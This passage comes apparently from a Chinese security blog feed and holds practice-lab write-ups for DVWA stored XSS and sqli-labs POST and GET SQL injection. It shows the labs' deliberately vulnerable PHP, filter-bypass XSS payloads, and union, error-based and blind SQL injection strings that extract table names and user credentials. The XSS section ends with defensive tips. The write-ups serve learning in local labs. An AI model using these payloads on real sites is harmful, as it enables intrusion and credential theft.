class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>未进行过滤，直接写入xss代码</p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311215448348.png" alt="image-20230311215448348"></p><p>medium</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>addslashes(string) ：函数返回在预定义字符之前添加反斜杠的字符串，预定义字符 ’ 、” 、\ 、NULL</p><p>strip_tags(string) ：函数剥去string字符串中的 HTML、XML 以及 PHP 的标签</p><p>htmlspecialchars(string)： 把预定义的字符 “&lt;” （小于）、 “&gt;” （大于）、&amp; 、‘’、“” 转换为 HTML 实体，防止浏览器将其作为HTML元素</p><p>根据源码可以看出message已经被过滤，所以只能在name下手</p><p>使用大小写绕过str_replace</p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311221528661.png" alt="image-20230311221528661"></p><p>被限制长度最大为10，改为100</p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311221746474.png" alt="image-20230311221746474"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&#x27;hack&#x27;</span>)</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311221854152.png" alt="image-20230311221854152"></p><p>high</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>写入xss就可以，过滤了script，使用img等就可以</p><p><img src="/2023/03/11/XSS%E5%9F%BA%E7%A1%80/Users\zhang\AppData\Roaming\Typora\typora-user-images\image-20230311224056647.png" alt="image-20230311224056647"></p><p>impossible</p><p>只要使用htmlspecialchars(string)将name和massage都转化为实体，过滤就不存在xss漏洞</p><h2 id="XSS的防御"><a href="#XSS的防御" class="headerlink" title="XSS的防御"></a>XSS的防御</h2><p>1、在前端js对输入的字符使用htmlspecialchars函数将输入内容html实体化</p><p>2、尽量采用白名单策略，只允许特定字符输入，并在前端过滤掉#字符</p><p>3、采用黑名单过滤特殊字符，如script、&lt;&gt;、&lt;、alert等</p><p>4、将重要的cookie设置为http only，防止黑客通过JavaScript的document.cookie盗取cookie值</p><p>5、过滤javascript的on事件，如onclick、onload、onerror等</p></ImG></script>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sqllibsPOST类型注入</title>
    <link href="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="less-11-基于错误的POST单引号注入"><a href="#less-11-基于错误的POST单引号注入" class="headerlink" title="less-11:基于错误的POST单引号注入"></a>less-11:基于错误的POST单引号注入</h2><p>post注入需要使用到hackbar和burp，步骤与get注入相同</p><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1# &amp;passwd=1&amp;submit=Submit  正常</span><br><span class="hljs-string">uname=1&#x27;</span> <span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit    报错<br><br></code></pre></td></tr></table></figure><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310192137741.png" alt="image-20230310192137741"></p><p>接下来可以使用联合注入，方法有get注入相同</p><h3 id="爆数据信息"><a href="#爆数据信息" class="headerlink" title="爆数据信息"></a>爆数据信息</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 2#  &amp;passwd=1&amp;submit=Submit  正常</span><br><span class="hljs-string">uname=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">3</span>#  <span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit  错误<br>uname<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2 #  &amp;passwd=1&amp;submit=Submit   判断回显位</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310192418517.png" alt="image-20230310192418517"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #  &amp;passwd=1&amp;submit=Submit</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310192649641.png" alt="image-20230310192649641"></p><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310192746013.png" alt="image-20230310192746013"></p><h2 id="less-12-基于错误的双引号注入"><a href="#less-12-基于错误的双引号注入" class="headerlink" title="less-12:基于错误的双引号注入"></a>less-12:基于错误的双引号注入</h2><h3 id="判断注入点-1"><a href="#判断注入点-1" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;&amp;passwd=1&amp;submit=Submit   没反应</span><br><span class="hljs-string">uname=1&quot;&amp;passwd=1&amp;submit=Submit   报错</span><br><span class="hljs-string">uname=1&quot; or 1=1 # &amp;passwd=1&amp;submit=Submit 错误</span><br><span class="hljs-string">version for the right syntax to use near &#x27;&#x27; at line 1</span><br><span class="hljs-string">uname=1&quot;) or 1=1# &amp;passwd=1&amp;submit=Submit  正常</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310193351735.png" alt="image-20230310193351735"></p><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310193931008.png" alt="image-20230310193931008"></p><p>接下来相同与less-11</p><h2 id="less-13-基于POST单引号双注入"><a href="#less-13-基于POST单引号双注入" class="headerlink" title="less-13:基于POST单引号双注入"></a>less-13:基于POST单引号双注入</h2><h3 id="判断注入点-2"><a href="#判断注入点-2" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) or 1=1# &amp;passwd=1&amp;submit=Submit 正常</span><br><span class="hljs-string">uname=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span># <span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>submit<span class="hljs-operator">=</span>Submit  错误，根据报错可以看出他的闭合方式<br></code></pre></td></tr></table></figure><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310194252669.png" alt="image-20230310194252669"></p><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310194446432.png" alt="image-20230310194446432"></p><p>正确登入和错误登入的区别，由此可以进行报错注入或者盲注</p><p>uname&#x3D;1’) and extractvalue(1,concat(‘~’,(select database())))# &amp;passwd&#x3D;1&amp;submit&#x3D;Submit</p><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310195445243.png" alt="image-20230310195445243"></p><h2 id="less-14-基于post双引号双注入"><a href="#less-14-基于post双引号双注入" class="headerlink" title="less-14:基于post双引号双注入"></a>less-14:基于post双引号双注入</h2><h3 id="判断注入点-3"><a href="#判断注入点-3" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; &amp;passwd=1&amp;submit=Submit<br>uname=1&quot; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">-- # &amp;passwd=1&amp;submit=Submit  正常</span><br></code></pre></td></tr></table></figure><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310195638162.png" alt="image-20230310195638162"></p><p>可以判断闭合方式</p><h3 id="使用floor和rand函数进行报错注入"><a href="#使用floor和rand函数进行报错注入" class="headerlink" title="使用floor和rand函数进行报错注入"></a>使用floor和rand函数进行报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-number">1</span>)uname<span class="hljs-operator">=</span>admin<span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(CONCAT(username,password) AS CHAR),0x7e)) FROM users LIMIT 0,1),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)#&amp;submit=Submit<br>(2)uname=1&quot; <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> limit <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x26</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x <span class="hljs-comment">-- #&amp;passwd=1&amp;submit=Submit</span><br><br></code></pre></td></tr></table></figure><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310200514061.png" alt="image-20230310200514061"></p><p>使用extractvalue</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span>&quot; and extractvalue(1,concat(&#x27;~&#x27;,(select database()))) -- #&amp;passwd=1&amp;submit=Submit<br></code></pre></td></tr></table></figure><p><img src="/2023/03/10/sqllibsPOST%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230310201613109.png" alt="image-20230310201613109"></p><h2 id="less-15-基于单引号的盲注"><a href="#less-15-基于单引号的盲注" class="headerlink" title="less-15:基于单引号的盲注"></a>less-15:基于单引号的盲注</h2><h3 id="判断注入点-4"><a href="#判断注入点-4" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span>登录失败无回显<br>uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1#&amp;passwd=1登录成功</span><br><span class="hljs-string">uname=1&quot; or 1=1#&amp;passwd=1登录失败无回显</span><br></code></pre></td></tr></table></figure><p>所以是单引号注入并且没有报错信息，不能进行报错注入，使用布尔盲注或者延时注入</p><p>布尔盲注</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or length(database())=8#&amp;passwd=1登录成功</span><br></code></pre></td></tr></table></figure><p>时间盲注</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">uname</span>=<span class="hljs-number">1</span>&amp;passwd=<span class="hljs-number">1</span>&#x27; or if(length(database())=<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>))-- #<br></code></pre></td></tr></table></figure><h2 id="less-16-基于双引号的盲注"><a href="#less-16-基于双引号的盲注" class="headerlink" title="less-16:基于双引号的盲注"></a>less-16:基于双引号的盲注</h2><p>只是闭合方式与15关不同</p>]]></content>
    
    
    <categories>
      
      <category>sql</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql</tag>
      
      <tag>sql注入</tag>
      
      <tag>GET</tag>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqllibs靶场GET类型注入</title>
    <link href="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="less-1-基于错误的GET单引号字符型注入"><a href="#less-1-基于错误的GET单引号字符型注入" class="headerlink" title="less-1:基于错误的GET单引号字符型注入"></a>less-1:基于错误的GET单引号字符型注入</h2><h3 id="注入点判断"><a href="#注入点判断" class="headerlink" title="注入点判断"></a>注入点判断</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-1</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/02/28/sqllibsGET%E7%B1%BB%E5%9E%8B%E6%B3%A8%E5%85%A5/image-20230228200519710.png" alt="image-20230228200519710"></p><p>通过报错可以看出是多了一个单引号，所以我们将后面的注释掉</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">http:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-operator">/</span>bachang<span class="hljs-operator">/</span>sqli<span class="hljs-operator">-</span>labs<span class="hljs-operator">/</span>Less<span class="hljs-number">-1</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure><p>回显正常</p><p>当我们尝试?id&#x3D;1’时报错但是尝试?id&#x3D;1”时为什么不报错？</p><ul><li>那是因为 Mysql 查询并不严格， 而在 select * from users where id&#x3D;’1’’ limit 0,1 中有一个单引号没有闭合而报错，而在 select * from users where id&#x3D;’1” ‘ limit 0,1 中虽然多了一个双引号，但 mysql 查询时会把它当成两个单引号，而这两个单引号又闭合了，所以查询时不会报错</li></ul><p>sql语句 源码分析</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;$_GET[id]&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>当输入id&#x3D;1’时</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> username,password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;&#x27; limit 0,1;</span><br></code></pre></td></tr></table></figure><p>这里产生了一个单着的单引号，因此sql语句会产生错误，需要将他注释掉</p><p>注释符</p><ul><li><h1 id><a href="#" class="headerlink" title></a></h1></li><li>%23（#的url编码）</li><li>–+（– %20）%20 是空格的url编码</li></ul><h3 